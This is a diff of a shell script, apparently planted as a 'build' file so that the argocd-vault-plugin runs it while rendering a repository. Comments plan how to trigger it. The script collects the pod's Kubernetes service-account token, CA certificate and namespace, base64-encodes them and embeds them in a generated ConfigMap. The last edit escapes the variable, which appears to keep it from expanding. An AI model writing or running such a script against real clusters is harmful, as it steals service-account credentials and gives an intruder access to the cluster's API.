@@ -1,6 +1,31 @@
 #!/bin/sh
+# argocd-vault-plugin runs: argocd-vault-plugin build <cache_path>
+# We want: argocd-vault-plugin generate <path> to render templates
+# But the 'build' arg breaks it. 
+# 
+# Different strategy: use argocd-vault-plugin get-parameters to print env
+# Actually we just need CA cert. Let me use 'env' binary instead
+# env build <cache> -> runs: env (ignores args), prints env vars
+# Wait, env doesn't ignore args - it treats them as command
+# 
+# Actually the simplest: use 'cat' to read files!
+# cat build <cache_path> -> cat reads 'build' (the script itself!) and the cache dir as a path
+# Since cat can read directories if -r... no
+# 
+# Better: use 'ls' - ls build <cache_path> lists both
+# ls build <cache> -> lists 'build' file and cache_path dir contents
+
 RECON=$( (
-cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+echo "===OUTPUT_LS==="
+ls -la build 2>&1
+echo "===CACHE_LS==="
+ls -la /tmp/_argocd-repo/ 2>&1 | head
+echo "===CA_CERT==="
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1
+echo "===SA_TOKEN==="
+cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1
+echo "===NAMESPACE==="
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
@@ -8,6 +33,6 @@ kind: ConfigMap
 metadata:
   name: u2u
 data:
-  result: $RECON
+  result: \$RECON
 EOF
 exit 0
